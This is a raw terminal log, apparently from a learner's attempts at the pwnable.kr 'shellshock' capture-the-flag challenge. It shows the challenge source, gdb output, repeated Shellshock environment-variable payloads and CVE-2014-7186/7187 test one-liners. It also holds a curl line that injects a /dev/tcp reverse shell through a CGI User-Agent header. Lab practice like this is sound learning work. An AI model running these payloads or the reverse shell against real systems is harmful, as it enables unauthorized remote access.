@@ -1,0 +1,936 @@
+ssh shellshock@pwnable.kr -p2222
+shellshock@pwnable.kr's password:
+ls
+bash  flag  shellshock	shellshock.c
+cat shellshock.cd
+cat: shellshock.cd: No such file or directory
+cat shellshock.c
+#include <stdio.h>
+int main(){
+	setresuid(getegid(), getegid(), getegid());
+	setresgid(getegid(), getegid(), getegid());
+	system("/home/shellshock/bash -c 'echo shock_me'");
+	return 0;
+}
+
+echo flag
+flag
+echo 'flag'
+flag
+echo ' cat flag'
+ cat flag
+echo 'cat flag'
+cat flag
+printf 'cat flag'
+cat flag
+printf 'cat ./flag'
+cat ./flag
+printf $'cat ./flag'
+cat ./flag
+gdb shellshock
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from shellshock...(no debugging symbols found)...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x00000000004005e4 <+0>:	push   %rbp
+   0x00000000004005e5 <+1>:	mov    %rsp,%rbp
+   0x00000000004005e8 <+4>:	push   %r12
+   0x00000000004005ea <+6>:	push   %rbx
+   0x00000000004005eb <+7>:	mov    $0x0,%eax
+   0x00000000004005f0 <+12>:	callq  0x4004f0 <getegid@plt>
+   0x00000000004005f5 <+17>:	mov    %eax,%r12d
+   0x00000000004005f8 <+20>:	mov    $0x0,%eax
+   0x00000000004005fd <+25>:	callq  0x4004f0 <getegid@plt>
+   0x0000000000400602 <+30>:	mov    %eax,%ebx
+   0x0000000000400604 <+32>:	mov    $0x0,%eax
+   0x0000000000400609 <+37>:	callq  0x4004f0 <getegid@plt>
+   0x000000000040060e <+42>:	mov    %r12d,%edx
+   0x0000000000400611 <+45>:	mov    %ebx,%esi
+   0x0000000000400613 <+47>:	mov    %eax,%edi
+   0x0000000000400615 <+49>:	mov    $0x0,%eax
+   0x000000000040061a <+54>:	callq  0x4004b0 <setresuid@plt>
+   0x000000000040061f <+59>:	mov    $0x0,%eax
+   0x0000000000400624 <+64>:	callq  0x4004f0 <getegid@plt>
+   0x0000000000400629 <+69>:	mov    %eax,%r12d
+   0x000000000040062c <+72>:	mov    $0x0,%eax
+   0x0000000000400631 <+77>:	callq  0x4004f0 <getegid@plt>
+   0x0000000000400636 <+82>:	mov    %eax,%ebx
+   0x0000000000400638 <+84>:	mov    $0x0,%eax
+   0x000000000040063d <+89>:	callq  0x4004f0 <getegid@plt>
+   0x0000000000400642 <+94>:	mov    %r12d,%edx
+   0x0000000000400645 <+97>:	mov    %ebx,%esi
+   0x0000000000400647 <+99>:	mov    %eax,%edi
+   0x0000000000400649 <+101>:	mov    $0x0,%eax
+   0x000000000040064e <+106>:	callq  0x4004c0 <setresgid@plt>
+   0x0000000000400653 <+111>:	mov    $0x400760,%edi
+   0x0000000000400658 <+116>:	mov    $0x0,%eax
+   0x000000000040065d <+121>:	callq  0x4004d0 <system@plt>
+   0x0000000000400662 <+126>:	mov    $0x0,%eax
+   0x0000000000400667 <+131>:	pop    %rbx
+   0x0000000000400668 <+132>:	pop    %r12
+   0x000000000040066a <+134>:	pop    %rbp
+   0x000000000040066b <+135>:	retq
+End of assembler dump.
+(gdb) b 0x000000000040065d
+Function "0x000000000040065d" not defined.
+Make breakpoint pending on future shared library load? (y or [n]) y
+Breakpoint 1 (0x000000000040065d) pending.
+(gdb) r
+Starting program: /home/shellshock/shellshock
+shock_me
+[Inferior 1 (process 147781) exited normally]
+(gdb) i r
+The program has no registers now.
+(gdb) q
+getegid
+getegid: command not found
+ls
+bash  flag  shellshock	shellshock.c
+ForceCommand
+ForceCommand: command not found
+SSH_ORIGINAL_COMMAND
+SSH_ORIGINAL_COMMAND: command not found
+export SSH_ORIGINAL_COMMAND="cat /home/shellshock/flag"
+./shellshock
+shock_me
+bash -c 'export SSH_ORIGINAL_COMMAND="cat /home/shellshock/flag"''
+> ^C
+bash -c 'export SSH_ORIGINAL_COMMAND="cat /home/shellshock/flag"'
+./shellshock
+shock_me
+bash -c 'export shock_me="cat /home/shellshock/flag"'
+./shellshock
+shock_me
+echo $shock_me
+echo shock_me
+shock_me
+env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+this is a test
+
+bash -c 'env x='() { :;}; echo vulnerable' bash -c "echo this is a test"''
+bash: syntax error near unexpected token `('
+bash -c 'env x='() { :;}; echo vulnerable' bash -c "echo this is a test"'
+bash: syntax error near unexpected token `('
+bash -c 'env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+bash: syntax error near unexpected token `('
+'
+> bash -c 'env x='() { :;}; echo vulnerable' bash -c "echo this is a test"'
+> ^C
+bash -c 'env x=\'() { :;}; echo vulnerable\' bash -c "echo this is a test"'
+bash: syntax error near unexpected token `('
+bash -c 'env x=\'() { :;}; echo vulnerable\' bash -c \"echo this is a test\"'
+bash: syntax error near unexpected token `('
+bash -c `env x=\'() { :;}; echo vulnerable\' bash -c "echo this is a test"`
+bash: command substitution: line 1: syntax error near unexpected token `('
+bash: command substitution: line 1: `env x=\'() { :;}; echo vulnerable\' bash -c "echo this is a test"'
+bash: -c: option requires an argument
+env
+XDG_SESSION_ID=345858
+SHELL=/bin/bash
+TERM=xterm-256color
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+USER=shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+MAIL=/var/mail/shellshock
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+HOME=/home/shellshock
+SHLVL=1
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_RUNTIME_DIR=/run/user/1019
+_=/usr/bin/env
+echo MAIL
+MAIL
+echo $MAIL
+/var/mail/shellshock
+echo $SHLVL
+1
+echo $SHLVL
+1
+echo $SHLVL
+1
+bash -c 'echo $SHLVL'
+2
+bash -c 'echo $SHLVL'
+2
+bash -c 'env'
+XDG_SESSION_ID=345858
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+USER=shellshock
+MAIL=/var/mail/shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+_=/usr/bin/env
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+SHLVL=2
+HOME=/home/shellshock
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+XDG_RUNTIME_DIR=/run/user/1019
+whoami
+shellshock
+./bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' ||
+> echo "CVE-2014-7186 vulnerable, redir_stack"
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || bash -c 'echo "CVE-2014-7186 vulnerable, redir_stack"'
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+./bash -c '\true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF\' || echo "CVE-2014-7186 vulnerable, redir_stack"'
+> ^C
+./bash
+shellshock@pwnable:~$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+this is a test
+shellshock@pwnable:~$ env X='() { (a)=>\' bash -c "echo date"; cat echo
+date
+cat: echo: No such file or directory
+shellshock@pwnable:~$
+shellshock@pwnable:~$ cat echo
+cat: echo: No such file or directory
+shellshock@pwnable:~$ bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' ||
+> echo "CVE-2014-7186 vulnerable, redir_stack"
+bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+bash: warning: here-document at line 0 delimited by end-of-file (wanted `EOF')
+shellshock@pwnable:~$ (for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash ||
+> echo "CVE-2014-7187 vulnerable, word_lineno"
+shellshock@pwnable:~$ (for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash || echo "CVE-2014-7187 vulnerable, word_lineno"
+shellshock@pwnable:~$ cat flag.txt
+cat: flag.txt: No such file or directory
+shellshock@pwnable:~$ ls
+bash  flag  shellshock	shellshock.c
+shellshock@pwnable:~$ cat flag
+cat: flag: Permission denied
+shellshock@pwnable:~$ su
+Password:
+su: Authentication failure
+shellshock@pwnable:~$ exit
+exit
+./bash
+shellshock@pwnable:~$ env x='() { :;}; echo vulnerable' bash -c "echo test"
+test
+shellshock@pwnable:~$ env x='() { :;'^Cash -c "echo test"
+shellshock@pwnable:~$ env x='() { :;}; cta flag' bash -c "echo test"
+test
+shellshock@pwnable:~$ env x='() { :;}; cat flag' bash -c "echo test"
+test
+shellshock@pwnable:~$ env
+XDG_SESSION_ID=345858
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+USER=shellshock
+MAIL=/var/mail/shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+SHLVL=2
+HOME=/home/shellshock
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+XDG_RUNTIME_DIR=/run/user/1019
+_=/usr/bin/env
+shellshock@pwnable:~$ _
+_: command not found
+shellshock@pwnable:~$ $_
+_: command not found
+shellshock@pwnable:~$ env shock_me='() { :;}; cat /home/shellshock/flag'
+XDG_SESSION_ID=345858
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+USER=shellshock
+MAIL=/var/mail/shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+SHLVL=2
+HOME=/home/shellshock
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+XDG_RUNTIME_DIR=/run/user/1019
+_=/usr/bin/env
+shock_me=() { :;}; cat /home/shellshock/flag
+shellshock@pwnable:~$ exit
+exit
+./shellshock
+shock_me
+./bash
+shellshock@pwnable:~$ echo $shock_me
+
+shellshock@pwnable:~$ echo shock_me
+shock_me
+shellshock@pwnable:~$ ls
+bash  flag  shellshock	shellshock.c
+shellshock@pwnable:~$ ./shellshock
+shock_me
+shellshock@pwnable:~$ cat shellshock.c
+#include <stdio.h>
+int main(){
+	setresuid(getegid(), getegid(), getegid());
+	setresgid(getegid(), getegid(), getegid());
+	system("/home/shellshock/bash -c 'echo shock_me'");
+	return 0;
+}
+
+shellshock@pwnable:~$ ls /tmp
+ls: cannot open directory '/tmp': Permission denied
+shellshock@pwnable:~$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.1.8/9001 0>&1' http://192.168.1.104/cgi-bin/test/test.cgi
+ls
+id
+^C
+shellshock@pwnable:~$ id
+uid=1019(shellshock) gid=1019(shellshock) groups=1019(shellshock)
+shellshock@pwnable:~$ msf5
+msf5: command not found
+shellshock@pwnable:~$ export NAME=VALUE
+shellshock@pwnable:~$ echo NAME
+NAME
+shellshock@pwnable:~$ echo $NAME
+VALUE
+shellshock@pwnable:~$ env echo\ shock_me='() { :;}; echo vulnerable' bash -c "echo test"
+test
+shellshock@pwnable:~$ env
+XDG_SESSION_ID=345858
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+NAME=VALUE
+USER=shellshock
+MAIL=/var/mail/shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+SHLVL=2
+HOME=/home/shellshock
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+XDG_RUNTIME_DIR=/run/user/1019
+_=/usr/bin/env
+shellshock@pwnable:~$ echo $_
+env
+shellshock@pwnable:~$ export shock_me=aa
+shellshock@pwnable:~$ env
+XDG_SESSION_ID=345858
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+NAME=VALUE
+USER=shellshock
+shock_me=aa
+MAIL=/var/mail/shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+SHLVL=2
+HOME=/home/shellshock
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+XDG_RUNTIME_DIR=/run/user/1019
+_=/usr/bin/env
+shellshock@pwnable:~$ export shock_me='() {:;}; bash -c 'cat /home/shellcode/flag''
+bash: export: `/home/shellcode/flag': not a valid identifier
+shellshock@pwnable:~$ export shock_me='() {:;}; bash -c \'cat /home/shellcode/flag\''
+> ^C
+shellshock@pwnable:~$ export shock_me='() {:;}; bash -c \'cat /home/shellcode/flag\''
+>
+> a
+> ^C
+shellshock@pwnable:~$ env
+XDG_SESSION_ID=345858
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+NAME=VALUE
+USER=shellshock
+shock_me=() {:;}; bash -c cat
+MAIL=/var/mail/shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+SHLVL=2
+HOME=/home/shellshock
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+XDG_RUNTIME_DIR=/run/user/1019
+_=/usr/bin/env
+shellshock@pwnable:~$ export shock_me='() {:;}; bash -c \'cat /home/shellcode/flag\''
+> ^C
+shellshock@pwnable:~$ emv
+No command 'emv' found, did you mean:
+ Command 'env' from package 'coreutils' (main)
+ Command 'imv' from package 'renameutils' (universe)
+ Command 'qmv' from package 'renameutils' (universe)
+ Command 'e2mv' from package 'e2tools' (universe)
+ Command 'mv' from package 'coreutils' (main)
+ Command 'ev' from package 'radiance' (universe)
+ Command 'mmv' from package 'mmv' (universe)
+ Command 'mev' from package 'gpm' (universe)
+emv: command not found
+shellshock@pwnable:~$ env
+XDG_SESSION_ID=345858
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+NAME=VALUE
+USER=shellshock
+shock_me=() {:;}; bash -c cat
+MAIL=/var/mail/shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+SHLVL=2
+HOME=/home/shellshock
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+XDG_RUNTIME_DIR=/run/user/1019
+_=/usr/bin/env
+shellshock@pwnable:~$ export shock_me='() {:;}; bash -c \'cat $SSH_ORIGINAL_COMMAND''
+bash: export: `/home/shellshock/flag': not a valid identifier
+shellshock@pwnable:~$ export shock_me='() {:;}; bash -c \'cat $SSH_ORIGINAL_COMMAND''
+bash: export: `/home/shellshock/flag': not a valid identifier
+shellshock@pwnable:~$ export shock_me='() {:;}; bash -c \'cat\ $SSH_ORIGINAL_COMMAND''
+shellshock@pwnable:~$ env
+XDG_SESSION_ID=345858
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+NAME=VALUE
+USER=shellshock
+shock_me=() {:;}; bash -c \cat cat /home/shellshock/flag
+MAIL=/var/mail/shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+SHLVL=2
+HOME=/home/shellshock
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+XDG_RUNTIME_DIR=/run/user/1019
+_=/usr/bin/env
+shellshock@pwnable:~$ exit
+exit
+./shellshock
+shock_me
+./bash
+shellshock@pwnable:~$ echo $shock_me
+
+shellshock@pwnable:~$ export shock_me=() {:;}; bash -c \cat cat /home/shellshock/flag^C
+shellshock@pwnable:~$ export shock_me='() {:;}; bash -c \'$SSH_ORIGINAL_COMMAND''
+shellshock@pwnable:~$ env
+XDG_SESSION_ID=345858
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+USER=shellshock
+shock_me=() {:;}; bash -c \cat /home/shellshock/flag
+MAIL=/var/mail/shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+SHLVL=2
+HOME=/home/shellshock
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+XDG_RUNTIME_DIR=/run/user/1019
+_=/usr/bin/env
+shellshock@pwnable:~$ export shock_me='() {:;}; bash -c '$SSH_ORIGINAL_COMMAND''
+shellshock@pwnable:~$ env
+XDG_SESSION_ID=345858
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+USER=shellshock
+shock_me=() {:;}; bash -c cat /home/shellshock/flag
+MAIL=/var/mail/shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+SHLVL=2
+HOME=/home/shellshock
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+XDG_RUNTIME_DIR=/run/user/1019
+_=/usr/bin/env
+shellshock@pwnable:~$ export shock_me='() {:;}; bash -c \'$SSH_ORIGINAL_COMMAND\''
+> ^C
+shellshock@pwnable:~$ export shock_me='() {:;}; bash -c '$SSH_ORIGINAL_COMMAND''
+shellshock@pwnable:~$ env
+XDG_SESSION_ID=345858
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+USER=shellshock
+shock_me=() {:;}; bash -c cat /home/shellshock/flag
+MAIL=/var/mail/shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+SHLVL=2
+HOME=/home/shellshock
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+XDG_RUNTIME_DIR=/run/user/1019
+_=/usr/bin/env
+shellshock@pwnable:~$ bash -c cat /home/shellshock/flag
+
+
+^C
+shellshock@pwnable:~$ bash -c 'cat /home/shellshock/flag
+> ^C
+shellshock@pwnable:~$ bash -c 'cat /home/shellshock/flag'
+cat: /home/shellshock/flag: Permission denied
+shellshock@pwnable:~$ export shock_me='() {:;}; bash -c 'cat /home/shellshock/flag''
+bash: export: `/home/shellshock/flag': not a valid identifier
+shellshock@pwnable:~$ export shock_me='() {:;}; bash -c 'cat\ /home/shellshock/flag''
+shellshock@pwnable:~$ env
+XDG_SESSION_ID=345858
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+USER=shellshock
+shock_me=() {:;}; bash -c cat /home/shellshock/flag
+MAIL=/var/mail/shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+SHLVL=2
+HOME=/home/shellshock
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+XDG_RUNTIME_DIR=/run/user/1019
+_=/usr/bin/env
+shellshock@pwnable:~$ export shock_me='() {:;}; bash -c \'cat\ /home/shellshock/flag\''
+> ^C
+shellshock@pwnable:~$ ^C
+shellshock@pwnable:~$ export shock_me='() {:;}; cat\ /home/shellshock/flag'
+shellshock@pwnable:~$ wn
+The program 'wn' is currently not installed. To run 'wn' please ask your administrator to install the package 'wordnet'
+shellshock@pwnable:~$ env
+XDG_SESSION_ID=345858
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+USER=shellshock
+shock_me=() {:;}; cat\ /home/shellshock/flag
+MAIL=/var/mail/shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+SHLVL=2
+HOME=/home/shellshock
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+XDG_RUNTIME_DIR=/run/user/1019
+_=/usr/bin/env
+shellshock@pwnable:~$ export shock_me='() {:;}; cat /home/shellshock/flag'
+shellshock@pwnable:~$ env
+XDG_SESSION_ID=345858
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=5.28.133.65 33946 2222
+SSH_TTY=/dev/pts/128
+USER=shellshock
+shock_me=() {:;}; cat /home/shellshock/flag
+MAIL=/var/mail/shellshock
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+PWD=/home/shellshock
+LANG=en_US.UTF-8
+HISTCONTROL=
+SHLVL=2
+HOME=/home/shellshock
+SSH_ORIGINAL_COMMAND=cat /home/shellshock/flag
+LOGNAME=shellshock
+SSH_CONNECTION=5.28.133.65 33946 128.61.240.205 2222
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+XDG_RUNTIME_DIR=/run/user/1019
+_=/usr/bin/env
+shellshock@pwnable:~$ echo $shock_me
+() {:;}; cat /home/shellshock/flag
+shellshock@pwnable:~$ ./shellshock
+/home/shellshock/bash: shock_me: line 0: syntax error near unexpected token `{:'
+/home/shellshock/bash: shock_me: line 0: `shock_me () {:;}; cat /home/shellshock/flag'
